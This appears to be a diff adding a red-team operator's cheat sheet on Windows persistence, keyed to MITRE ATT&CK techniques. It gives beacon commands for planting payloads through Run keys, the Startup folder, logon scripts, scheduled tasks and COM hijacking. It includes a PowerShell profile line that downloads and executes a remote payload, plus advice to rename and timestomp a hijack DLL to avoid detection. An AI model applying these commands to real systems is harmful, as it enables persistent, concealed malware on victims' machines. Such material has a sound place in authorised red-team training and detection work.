@@ -1,0 +1,49 @@
+Boot & Logon Autostart Execution: T1547
+
+Registry (upload payload to path and use registry)
+- HKCU\Software\Microsoft\Windows\CurrentVersion\Run <- Runs always
+- HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce  <-Runs once and gone
+Command to use in beacon: reg_set <host:optional> <hive> <key> <value> <type> <data>
+- reg_query to check
+- reg_delete to remove
+----------------------------------------------------
+Startup Folder
+%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup <- put payload there
+----------------------------------------------------
+Logon Scripts: T1037.001
+
+HKCU\Environment\UserInitMprLogonScript
+ reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\Path_to_payload
+ 
+(This is different then when we modified the actual login scripts on the network)
+----------------------------------------------------
+
+Powershell Profile: T1546.013
+Ex. location for a profile: $HOME\Documents\WindowsPowerShell\Profile.ps1 (Microsoft has other locations as well). If it dont exist you can create it (with correct perms)
+- need to make sure your code does not block the provile script from loading
+$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("url_to_payload") }
+
+-----------------------------------------------------
+
+Schedule Task: T1053.005
+schtaskscreate \Beacon XML CREATE <-- BOF to schedule a task (Replace Beacon with Name we want)
+schtasksdelete to remove it.
+
+-----------------------------------------------------
+
+Com Hijacking (Component Object Model (COM)): T1546.015
+
+Allows a interface that all the languages can use. 
+
+HKEY_CLASSES_ROOT\CLSID 
+- InProcServer32 or LocalServer32
+-- Path to DLL or EXE on the disk that provides COM function
+
+Procmon filters to find com hijacking
+- The Operation is RegOpenKey.
+- The Path contains InprocServer32 or LocalServer32.
+- The Result is NAME NOT FOUND
+Rename and timestomp the DLL to help it blend in.
+
+
+
